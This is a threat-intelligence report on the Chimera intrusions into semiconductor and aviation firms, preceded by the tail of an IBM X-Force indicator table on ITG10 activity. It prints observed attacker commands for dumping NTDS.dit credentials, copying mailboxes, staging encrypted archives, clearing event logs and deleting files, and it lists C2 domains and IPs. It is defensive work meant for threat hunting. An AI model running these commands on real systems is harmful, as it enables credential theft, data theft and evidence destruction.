76d0133d738876f314ae792d0cf949710b66266ba0cebefbd98ce40c64a9b15b PDF Decoy MFZ Executive Summary Korea.pdf 5678196f512f8a531c7d85af8df4f40c7a5f9c27331b361bb1a1c46d317a77d8 PDF Decoy 230130.pdf C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe Icon Location C:\Program Files (x86)\Hnc\Office 2020\HOffice110\Bin\Hwp.exe Icon Location hxxps[:]//api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalFOTHZFRV9DVU9iUFdnLXhPZG8xRXFYckU_ZT1BM1QwV2Q/root/content URL Document Location hxxps[:]//api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRlNnFWazdDNHp2Yy1SekU_ZT1SSFZJSk4/root/content URL Document Location hxxps[:]//api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBaFFNUDZlZzhhUkZiN0xVMUNPQ2YzeE5vVFU_ZT1wZ2liaUM/root/content URL Document Location hxxps[:]//api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRiZnpnVU14TmJJbkM2Q0k_ZT1WZElLSjE/root/content URL Document Location hxxps[:]//api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBdTJteTF4aDZ0OFhnUjJNem1zOG5oUndvLTZCP2U9akhIQzZ5/root/content URL Document Location 6bab11d9561482777757f16c069ebef3f1cd6885dbef55306ffde30037a41d48 LNK 7529eaeeb29c713f8e15827c79001a9227d8bc31c9209bf524a4ff91648a526e VBS xn--vn4b27hka971hbue[.]kr C2 GET Request 50fe8a981a7d4824f0b297f37804b65672ed4484e198e7c324260a34941ddac7 LNK 3d1d2d0464013d9e1dd7611d73176f3a31328a41d6474d5b6d0582ad09d3b17d VBS partybbq.co[.]kr C2 GET Request 1ec4d60738a671f00089a86eeba6cb13750bce589e84fd177707718a4cc7d8f1 LNK 88c219656f853b2dc54ae02d32a716e10c8392ed471d1c813e57de2dc170951e VBS 7aa7233feb8e8a7b71ae6cdd0ddb8c2b192d4b6e131fed1ade82efdcb8096c57 JPEG Decoy Scroll to view full table To learn how IBM X-Force can help you with anything regarding cybersecurity including incident response, threat intelligence, or offensive security services schedule a meeting here: IBM X-Force Scheduler If you are experiencing cybersecurity issues or an incident, contact X-Force to help: US hotline 1-888-241-9812 | Global hotline (+001) 312-212-8034 
The post ITG10 Likely Targeting South Korean Entities of Interest to the Democratic People’s Republic of Korea (DPRK) appeared first on Security Intelligence. 
title: Abusing cloud services to fly under the radar url: https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/ tl;dr NCC Group and Fox-IT have been tracking a threat group with a wide set of interests, from intellectual property (IP) from victims in the semiconductors industry through to data from the airline industry. 
In their intrusions they regularly abuse cloud services from Google and Microsoft to achieve their goals.
NCC Group and Fox-IT observed this threat actor during various incident response engagements performed between October 2019 until April 2020.
Our threat intelligence analysts noticed clear overlap between the various cases in infrastructure and capabilities, and as a result we assess with moderate confidence that one group was carrying out the intrusions across multiple victims operating in Chinese interests. 
In open source this actor is referred to as Chimera by CyCraft. 
NCC Group and Fox-IT have seen this actor remain undetected, their dwell time, for up to three years.
As such, if you were a victim, they might still be active in your network looking for your most recent crown jewels. 
We contained and eradicated the threat from our client’s networks during incident response whilst our Managed Detection and Response (MDR) clients automatically received detection logic. 
With this publication, NCC Group and Fox-IT aim to provide the wider community with information and intelligence that can be used to hunt for this threat in historic data and improve detections for intrusions by this intrusion set. 
Throughout we use terminology to describe the various phases, tactics, and techniques of the intrusions standardized by MITRE with their ATT&CK framework .
Near the end of this article all the tactics and techniques used by the adversary are listed with links to the MITRE website with more information. 
From initial access to defense evasion: how it is done In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.
The objective in these cases appear to be stealing sensitive data from the victim’s networks. 
Credential theft and password spraying to Cobalt Strike This adversary starts with obtaining usernames and passwords of their victim from previous breaches.
These credentials are used in a credential stuffing or password spraying attack against the victim’s remote services, such as webmail or other internet reachable mail services.
After obtaining a valid account, they use this account to access the victim’s VPN, Citrix or another remote service that allows access to the network of the victim.
Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.
With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.
With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.
From here on the adversary stops using the victim’s remote service to access the victim’s network, and starts using the Cobalt Strike beacon for remote access and command and control. 
Network discovery and lateral movement 
The adversary continues their discovery of the victim’s network from patient zero.
Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.
If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.
Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.
After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim’s network.
If the victim’s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.
The adversary is typically able to perform all the steps described above within one day. 
During this process, the adversary identifies data of interest from the network of the victim.
This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.
If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.
However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary. 
After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.
At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.
But this isn’t done consistently across their engagements. 
Framing the adversary’s work in the MITRE ATT&CK framework Credential access (TA0006) 
The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.
The more recent intrusions took place in 2019 at companies in the aviation industry.
The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry. 
The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.
Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.
They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.
Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.
While usernames for legitimate logins at the victim’s network were generally formatted like <domain>\<username>.
And attempted logins came from a relative small set of IP-addresses. 
For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying. 
Initial access (TA0001) 
In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there. 
In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.
This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.
Within an hour after grabbing this document, the adversary accessed the company portal with the valid account. 
From this portal it was possible to launch the web-based VPN.
The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account’s primary or alternate phone number.
It was possible to configure an alternate phone number for the logged in user account at the company portal.
The adversary used this opportunity to configure an alternate phone number controlled by the adversary. 
By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.
However, they also made a mistake during this process within one incident.
Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.
However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).
NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser’s language settings used during the authentication flow.
Thus the 2FA code was sent with supporting Chinese text. 
Account discovery (T1087) With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).
But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands: net user net user Administrator net user <username>
/domain net localgroup administrators If the user account doesn’t have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admin’s usernames.
To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.
The built-in Windows quser-command to show logged on users is also heavily used by them.
If such a privileged user was recently active on a server the adversary executes Cobalt Strike’s built-in Mimikatz to dump its password hashes. 
Privilege escalation (TA0004) 
The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.
In other cases, the adversary moved laterally to another system with a domain admin logged in.
We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.
The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command: msadcs.exe "NTDS.dit" -s
"SYSTEM" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv Note: the adversary renamed ntdsaudit.exe to msadcs.exe. 
But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit: ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\tmp" q q esentutl /p /o
ntds.dit Both ntdsutil and esentutl are by default installed on a domain controller. 
A tool used by the adversary which wasn’t installed on the servers by default, was DSInternals.
DSInternals is a PowerShell module that makes use of internal Active Directory features.
The files and directories found on various systems of a victim match with DSInternals version 2.16.1.
We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.
We haven’t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both. 
Execution (TA0002) 
The adversary installs a hackers best friend during the intrusion: Cobalt Strike.
Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.
It has been widely adopted by malicious threats as well. 
The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner.
At least the following three versions of Cobalt Strike have been in use by the adversary: Cobalt Strike v3.8, observed Q2 2017Cobalt Strike v3.12, observed Q3 2018Cobalt Strike v3.14, observed Q2 2019 Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.
This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog “Identifying Cobalt Strike team servers in the wild”.
The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.
Because of this, historic information was available during this investigation.
Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.
If a match was found, the configuration of the Cobalt Strike team server was analysed.
This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings. 
The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
An example of the creation of such a scheduled task by the adversary: schtasks /create /ru
"SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00 
The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system. 
Persistence (TA0003) 
The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.
Once the system is rebooted, the beacon is gone.
The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.
Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
We haven’t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.
Maybe because it was never necessary. 
After the first bulk of data is exfiltrated, the persistent access into the victim’s network is periodically used by the adversary to check if new data of interest is available.
They also create a copy of the NTDS.dit and SYSTEM-registry hive file for new credentials to crack. Discovery (TA0007) 
The adversary applied a wide range of discovery tactics.
In the list below we have highlighted a few specific tools the adversary used for discovery purposes.
You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. 
Account discovery tool: PsLogListCommand used: psloglist.exe -accepteula -x security -s
-a
<date> 
This command exports a text file with comma separated fields.
The text files contain the contents of the Security Event log after the specified date. 
Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).
The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.
A possible intent of the adversary could be to identify if privileged users are active on the systems.
If such a privileged user was recently active on a server the actor executes Cobalt Strike’s built-in Mimikatz to dump its credentials or password hash. 
Account discovery tool: NtdsAuditCommand used: msadcs.exe
"NTDS.dit" -s
"SYSTEM" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv 
It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv. 
The NtdsAudit utility is an auditing tool for Active Directory databases.
It allows the user to collect useful statistics related to accounts and passwords.
The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page. 
Network service scanningCommand used: get -b <start ip> -e <end ip> -p get -b <start ip> -e <end ip> Get.exe appears to be a custom tool used to scan IP-ranges for HTTP service information.
NCC Group and Fox-IT decompiled the tool for analysis.
This showed the tool was written in the Python scripting language and packed into a Windows executable file.
Though Fox-IT didn’t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.
GetHttpsInfo scans the internal network for HTTP & HTTPS services.
The reconnaissance tool getHttpsInfo is able to discover HTTP servers within the range of a network. 
The tool was shared on a Chinese forum around 2016. 
Figure 1: Example of a download location for GetHttpsInfo.exe Lateral movement (TA0008) 
The adversary used the built-in lateral movement possibilities in Cobalt Strike.
Cobalt Strike has various methods for deploying its beacons at newly compromised systems.
We have seen the adversary using SMB, named pipes, PsExec, and WinRM.
The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim’s network.
They continue lateral movement and discovery in an attempt to identify the data of interest.
This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed. 
At one customer, the data of interest was stored in a separate security zone.
The adversary was able to find a dual homed system and compromise it.
From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone. 
In one event we saw the adversary compromise a Linux-system through SSH.
The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack. 
Lateral tool transfer (T1570) 
The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.
But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.
But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data. 
But first: How did they get the tools on the victim’s systems?
The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.
A few examples of commands we observed: copy get.exe \\<ip>\c$\windows\temp\ copy msadc*
\\<hostname>\c$\Progra~1\Common~1\System\msadc\ copy update.exe \\<ip>\c$\windows\temp\ move ak002.bat \\<ip>\c$\windows\temp\update.bat Collection (TA0009) 
In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim’s network.
As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.
This document was exfiltrated and used to continue the intrusion via a company portal and VPN. 
In all cases we’ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.
But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic /node:<ip> process call create "cmd /c copy c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst" copy "i:\<path>\<username>\My Documents\<filename>.pst" copy \\<hostname>\c$\Users\<username>\AppData\Local\Microsoft\Outlook*.ost Files and folders of interest are collected as well and staged for exfiltration. 
The goal of targeting some victims appears to be to obtain data.
How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed. 
The DLL’s used were side-loaded in memory on compromised systems.
After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory. 
Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.
This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic. 
We’ve seen the adversary staging data on a remote system or on the local system.
Most of the times the data is compressed and copied at the same time.
Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.
The adversary compresses and encrypts the data by using WinRAR from the command-line.
The filename of the command-line executable for WinRAR is RAR.exe by default. 
This activity group always uses a renamed version of rar.exe.
We have observed the following filenames overlapping all intrusions: jucheck.exeRecordedTV.msteredo.tmpupdate.exemsadcs1.exe The adversary typically places the executables in the following folders: C:\Users\Public\Libraries\C:\Users\Public\Videos\C:\Windows\Temp\ The following four different variants of the use of rar.exe as update.exe we have observed: update a -m5 -hp<password> <target_filename> <source> update a -m5 -r -hp<password> <target_filename> <source> update a -m5 -inul -hp<password> <target_filename> <source> update a -m5 -r -inul -hp<password> <target_filename> <source> 
The command lines parameters have the following effect: a = add to archive.m5 = use compression level
5.r = recurse subfolders.inul
= suppress error messages.hp<password> = encrypt both file data and headers with password. 
The used password, file extensions for the staged data differ per intrusion.
We’ve seen the use of .css, .rar, .log.txt, and no extension for staged pieces of data. 
After compromising a host with a Linux operating systems, data is also compressed.
This time the adversary compresses the data as a gzipped tar-file: tar.gz.
Sometimes no file extension is used, or the file extension is .il.
Most of the times the files names are prepended with adsDL_ or contain the word “list”.
The files are staged in the home folder of the compromised user account: /home/<username>/ Command and control (TA0011) 
The adversary uses Cobalt Strike as framework to manage their compromised systems.
We observed the use of Cobalt Strike’s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.
They switched to C2 encapsulated in HTTPS in Q3 2019.
An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.
This is important to note because the functionalities of Cobalt Strike’s trial version are limited.
More importantly: the trial version doesn’t support encryption of command and control traffic in cases where the protocol itself isn’t encrypted, such as DNS.
In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.
The DNS-responses weren’t logged.
This means that only the DNS C2 leaving the victim’s network was logged.
We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.
As the adversary used Cobalt Strike with DNS as command & control protocol, we were able to reconstruct more than two years of adversary activity.
With all this activity data, it was possible for us to create some insight into the ‘office’-hours of this adversary.
The activity took place six days a week, rarely on Sundays.
The activity started on average at 02:36 UTC and ended rarely after 13:00 UTC.
We observed some periods where we expected activity of the adversary, but almost none was observed.
These periods match with the Chinese Golden Week holiday. 
Figure 2: Heatmap of activity.
Times on the X-axis are in UTC. 
The adversary also changed their domains for command & control around the same time they switched C2 protocols.
They used a subdomain under a regular parent domain with a .com
TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.
The parent domain appspot.com is a domain owned by Google, and part of Google’s App Engine platform as a service.
Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft’s Azure content delivery network. 
Exfiltration (TA0010) 
The adversary uses the command and control channel to exfiltrate small amounts of data.
This is usually information containing account details.
For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. 
Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.
This tool exfiltrates specified files to cloud storage web services.
The following cloud storage web services are supported by the malware: DropboxGoogle DriveOneDrive The actor specifies the following arguments when running the exfiltration tool: Name of the web service to be usedParameters used for the web service, such as a client ID and/or API keyPath of the file to read and exfiltrate to the web service We have observed the exfiltration tool in the following locations: C:\Windows\Temp\msadcs.exeC:\Windows\Temp\OneDrive.exe Hashes of these files are listed at the end of this article. 
Defense evasion (TA0005) 
The adversary attempts to clean-up some of the traces from their intrusions.
While we don’t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing,File deletion,Timestomping An overview of the observed commands can be found in the appendix. 
For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.
This tool is included in the UnxUtils repository.
This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Creating a timeline is a common thing to do for forensic analysts to get a chronological view of events on a system. 
The same activity group? 
A number of our intrusions involved tips from an industry partner who was able to correlate some of their upstream activity. 
Our threat intelligence analysts observed clear overlap between the various cases that NCC Group and Fox-IT worked in the threat’s infrastructure and capabilities, and as a result we assess with moderate confidence one activity group was carrying out the intrusions across the different type of victims. 
Some overlap is very generic for a lot for a lot of groups, like the use of Cobalt Strike, or exfiltration to OneDrive.
But the tool used for exfiltration to OneDrive is very specific for this adversary.
The use of appspot and azureedge domains as well.
The naming convention for their subdomains, tools and scripts overlap too.
In summary: The adversary: Working hours match with GMT+8. 
Infrastructure: appspot.com and azureedge.net for C2 with a strong overlap in naming convention for subdomains and actual overlap in some subdomains between intrusions. 
Capability: Password spraying/credential stuffing.
Cobalt Strike.
Copy NTDS.dit.
Use scheduled tasks and batch files for automation.
The use of LOLBins.
WinRAR.
Cloud exfil tool and exfil to OneDrive.
Erasing Windows Event Logs, files and tasks.
Overlap in filenames for tools, staged data, and folders. 
Victim: Semiconductors and aviation industry. 
We considered labelling them as two activity groups, as of the difference in victims between various intrusions.
But all the other overlap is strong enough for us to consider it as one group right now.
This group might have gotten a new customer interested in different data which changed the intent and victims of the adversary. 
But most importantly: The largest overlap is in the top half of the pyramid of pain: domain names, host artifacts, tools, and TTPs.
And these are the hardest for the adversary to change, and most effective for long-lasting detection! 
Figure 3: Pyramid of pain by David J Bianco Fox-IT and NCC Group found some very strong overlap between what we’ve seen in our intrusion, and what Cycraft describes in their APT Group Chimera report and Blackhat presentation.
The bulk of the victims they describe are in different regions than we observed which is likely caused by field of view bias.
SentinelOne also describes an attack and shares IOC’s that show strong overlap with the intrusions we investigated. 
Conclusion At this moment we believe based on the evidence observed that the various intrusions were performed by the same group.
We can only report what we observed: first they stole intellectual property in the high tech sector, later they stole record, both across geographical locations.
Both types of stolen data are very useful for nation states. 
Answering if this group has an advanced persistent threat (APT) technique, has some sort of state affiliation, or where they come from goes beyond the scope of this write-up.
The threat intelligence and IOC’s we are sharing are intended to help discover and present intrusions by this and adversaries. 
A word of thanks goes out to all the forensic experts, incident responders, and threat intelligence analysts who helped victims identifying and eradicating the adversary.
And everybody from NCC Group and Fox-IT (part of NCC Group) for all the contributions to this article. 
IOC TypeDataObservedNoteBinary MD5133a159e86ff48c59e79e67a3b740c1e–get.exe (GetHttpsInfo)Binary MD5328ba584bd06c3083e3a66cb47779eac–psloglist.exeBinary MD565cf35ddcb42c6ff5dc56d6259cc05f3–update.exe (WinRAR)Binary MD54d5440282b69453f4eb6232a1689dd4a–msadcs.exe (Cloud exfil tool)Binary MD590508ff4d2fc7bc968636c716d84e6b4–msadcs.exe (Cloud exfil tool)Binary MD5c9b8cab697f23e6ee9b1096e312e8573–jucheck.exe (WinRAR)Binary MD5dd138a8bc1d4254fed9638989da38ab1–msadcs.exe (NTDSAudit)C2 domainEuDbSyncUp[.]comQ4 2017 – Q4 0218–C2 domainUsMobileSos[.]comQ4 2017 – Q4 2018–C2 domainofficeeuupdate.appspot[.]comQ4 2017 – Q4 2018–C2 domainMsCupDb[.]comQ4 2017 – Q4 2018–C2 domainofficeeuropupd.appspot[.]comQ3 2019 – Q1 2020–C2 domainplatform-appses.appspot[.]comQ4 2019 – Q1 2020–C2 domainwatson-telemetry.azureedge[.]netQ4 2019 – Q1 2020–C2 domaineurope-s03213.appspot[.]com2019–C2 domaineustylejssync.appspot[.]com 2019–C2 domainfsdafdsfdsaflkjkxvzcuifsad.azureedge[.]net2019–C2 domainictsyncserver.appspot[.]com2019–C2 domainsowfksiw38f2aflwfif.azureedge[.]net 2019–Filenamefs_action*.bat–Task automationFilenamefs_action*.ps1–Task automationFilenameupdate.bat–Task automationFilenameupdate*.bat–Task automationFilename*dsinternals*.dll –Dsinternals lib files Filenameget.exe–GetHttpsInfoFilenameadsDL_<dir>.log–Staging dataFilenamegroup_membership.csv–SharpHound outputFilenamelocal_admins.csv–SharpHound outputFilenamemsadcs.exe–Various toolsFilenamemsadcs1.exe–WinRARFilenameOneDrive.exe–Cloud data exfilFilenamesessions.csv–SharpHound outputFilenameRecordedTV.ms–WinRARFilenameRecordedTV_*.csv–Staging dataFilenameRecordedTV_*.ms–Staging dataFilenameRecordedTV_*.rar–Staging dataFilenameRecordedTV_*.txt–Staging dataFilenameteredo.tmp–WinRARFilenameupdate.exe–WinRARFilenamehsperfdata.sqm–Archive with toolsFilenameupdate*.log–Staging dataHostnameDESKTOP-0FVJ37C–Origin of login to ExchangeIPv4 address47.75.0[.]147Q2
2019Password sprayIPv4 address59.47.4[.]27Q2 2019ADFS loginIPv4 address45.9.248[.]74Q2 2019Citrix loginIPv4 address172.111.210[.]53Q2 2019Citrix loginIPv4 address103.51.145[.]123 2019Initial access IPv4 address119.39.248[.]32 2019Initial accessIPv4 address120.227.35[.]98 2019Initial accessIPv4 address14.229.140[.]66 2019Mount the file-share IPv4 address172.111.210[.]53 2019Initial accessIPv4 address188.72.99[.]41 2019Initial accessIPv4 address45.9.248[.]74 2019Initial accessIPv4
address47.75.0[.]147 2019Password sprayIPv4 address5.254.112[.]226 2019Initial accessIPv4 address5.254.64[.]234 2019Initial accessIPv4 address59.47.4[.]27 2019Initial accessIPv4 address39.109.5[.]135Q3 2017VPN server loginIPv4 address43.250.200[.]106Q3 2017VPN server loginIPv4 address119.39.248[.]101Q3 2017VPN server loginIPv4 address220.202.152[.]47Q3 2017VPN server loginIPv4 address119.39.248[.]20Q3 2017VPN server loginIPv4 address185.170.210[.]84Q3 2017VPN server loginIPv4 address43.250.201[.]71Q3 2017VPN server loginIPv4 address23.236.77[.]94Q3 2017ADFS loginPathC:\Code\NtdsAudit\src\NtdsAudit\obj\Release\–NTDSAudit artifactsPathC:\Users\Public\Appdata\Local\–Staging and toolsPathC:\Users\Public\Appdata\Local\Microsoft\Windows\INetCache–Staging and toolsPathC:\Users\Public\Libraries\–Staging and toolsPathC:\Users\Public\Videos\–Staging and toolsPathC:\Windows\Temp\–Staging and toolsPathC:\Windows\Temp\tmp–Staging and toolsURI in CS beacon/externalscripts/jquery/jquery-3.3.1.min.js Q3 2019 – Q1 2020–URI in CS beacon/externalscripts/jquery/jquery-3.3.2.min.jsQ2 2019 – Q3 2019–URI in CS beacon/jquery-3.3.2.slim.min.jsQ1 2020–User-agentMozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko–Web VPN loginUser-agentMozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko–Cobalt Strike beacon Observed discovery commands TechniqueCommandAccount discoverynet userAccount discoverynet user AdministratorAccount discoverynet user /domainAccount discoverydir \\<hostname>\c$\usersAccount discoverydsquery user -limit 0
-s
<hostname>Account
discoverypsloglist.exe -accepteula -x security -s
<current_date>Account discoverymsadcs.exe “NTDS.dit” -s
“SYSTEM” -p RecordedTV_pdmp.txt –users-csv RecordedTV_users.csvBrowser bookmark discoverytype \\<hostname>\c$\Users\<username>\Favorites\Links\Bookmarks bar\Imported From IE\*citrix*Domain trust discoverynltest /domain_trustsFile and directory discoverydir \\<hostname>\c$\File and directory discoverydir /o:
d /x /s c:\File and directory discoverydir /o:
d /x \\<hostname>\<fileshare>File and directory discoverycacl <path to file>Network service scanningget -b <start ip> -e <end ip> -pNetwork service scanningget -b <start ip> -e <end ip>Network share discoverynet shareNetwork share discoverynet view \\<hostname>Permission groups discoverynet localgroup administratorsProcess discoverytasklist /v
|findstr explorerProcess discoverytasklist /v
|findstr taskhostProcess discoverytasklist /v
|findstr 1716Process discoverytasklist /v /s
<hostname/ip>Query registryreg query
\\<host>\HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\ServersQuery registryreg query \\<host>\HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Internet
SettingsRemote system discoverytype \\<host>\c$\Users\<username>\Favorites\Links\Bookmarks bar\Imported From IE\*citrix*Remote system discoverytype
\\<host>\<path>\Cookies\*ctx*Remote system discoveryreg query \\<host>\HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\ServersRemote system discoverydir /o:
d /x \\<hostname>\c$\users\<username>\FavoritesRemote system discoverynet view \\hostnameRemote system discoverydsquery server -limit 0System information discoveryfsutil fsinfo drivesSystem information discoverysysteminfoSystem information discoveryvssadmin list shadowsSystem network configuration discoveryipconfigSystem network configuration discoveryipconfig /allSystem
network configuration discoveryping -n
1 -a <ip>System network configuration discoveryping -n
1 <hostname>System network configuration discoverytracert <ip>System network configuration discoverypathping <ip>System network connections discoverynetstat -ano | findstr ESTSystem Owner/User DiscoveryquserSystem service discoverynet startSystem service discoverynet useSystem time discoverytime /tSystem time discoverynet time \\<ip/hostname> Observed Defense evasion commands Indicator Removal on Host: Clear Windows Event Logs wevtutil cl "Windows PowerShell" wevtutil cl application wevtutil cl security wevtutil cl setup wevtutil cl system Indicator Removal on Host: File Deletion del /f/q *.csv *.bin del /f/q *.exe del /f/q *.exe *log.txt del /f/q *.ost del /f/q .rar update .txt del /f/q \\c$\windows\temp*.txt del /f/q \\c$\Progra~1\Common~1\System\msadc\msadcs.dmp del /f/q msadcs* del /f/q psloglist.exe del /f/q update* del /f/q update* .txt del /f/q update.rar del /f/q update*rar del /f/q update12321312.rarschtasks /delete
/s /tn "update" /f schtasks /delete
/tn "update" /f shred -n 123 -z
-u .tar.gz MITRE ATT&CK references NameTypeIDMore infoInitial AccessTacticTA0001https://attack.mitre.org/tactics/TA0001/External Remote ServicesTechniqueT1133https://attack.mitre.org/techniques/T1133/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/ExecutionTacticTA0002https://attack.mitre.org/tactics/TA0002/Command and Scripting Interpreter:
PowerShellTechniqueT1059.001https://attack.mitre.org/techniques/T1059/001/Command and Scripting Interpreter:
Windows Command ShellTechniqueT1059.003https://attack.mitre.org/techniques/T1059/003/Scheduled Task/Job: Scheduled TaskTechniqueT1053.005https://attack.mitre.org/techniques/T1053/005/System
